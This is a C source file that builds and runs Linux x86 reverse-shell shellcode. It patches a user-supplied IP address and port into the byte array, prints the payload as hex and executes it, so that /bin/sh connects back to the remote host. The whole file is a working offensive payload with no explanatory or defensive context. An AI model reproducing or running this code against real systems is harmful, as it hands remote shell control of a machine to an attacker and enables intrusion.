
#include <stdio.h>
#include <string.h>
#include <getopt.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

unsigned char shellcode[] = \
	"\x6a\x66\x58\x99\x6a\x01\x5b\x52\x6a\x01"
	"\x6a\x02\x89\xe1\xcd\x80\x97\xb0\x66\x6a"
	"\x03\x5b\x68\xAA\xAA\xAA\xAA\x66\x68\xBB"
	"\xBB\x66\x6a\x02\x89\xe1\x6a\x10\x51\x57"
	"\x89\xe1\xcd\x80\x89\xfb\x6a\x02\x59\xb0"
	"\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x52\x68"
	"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54"
	"\x5b\x89\xd1\xcd\x80";

void print_usage() {
    printf("Usage: ./reverse -h IP -p PORT\n");
 
    exit(EXIT_SUCCESS);
}

int main(int argc, char ** argv)
{

  int opt, i;
  __uint32_t host;
  __uint16_t port;
 
  if (argc != 5) 
  	print_usage();
	  
  while ((opt = getopt (argc, argv, "h:p:")) != -1) {
  	switch (opt) {
  		case 'h':
      			host = inet_addr(optarg);
      		
      			shellcode[23] = host & 0xff;
      			shellcode[24] = (host >> 8) & 0xff;
      			shellcode[25] = (host >> 16) & 0xff;
			shellcode[26] = (host >> 24) & 0xff;
    
        	        break;
		case 'p':

      			port = atoi(optarg);

			shellcode[30] = port & 0xff;
			shellcode[29] = (port >> 8) & 0xff;

       		        break;
	}
  }

  printf("[*] shellcode length: %d\n", strlen(shellcode));

  for (i = 0; i < 75; i += 15) {
  	printf("\\x%02x\\x%02x\\x%02x\\x%02x\\x%02x\\x%02x\\x%02x\\x%02x\\x%02x\\x%02x\\x%02x\\x%02x\\x%02x\\x%02x\\x%02x\n", shellcode[i], shellcode[i+1], shellcode[i+2], shellcode[i+3], shellcode[i+4], shellcode[i+5], shellcode[i+6], shellcode[i+7], shellcode[i+8], shellcode[i+9], shellcode[i+10], shellcode[i+11], shellcode[i+12], shellcode[i+13], shellcode[i+14]);
  }
	
  printf("[*] connecting...\n");
	
  int (*ret)() = (int(*)()) shellcode;

  ret();
	
}
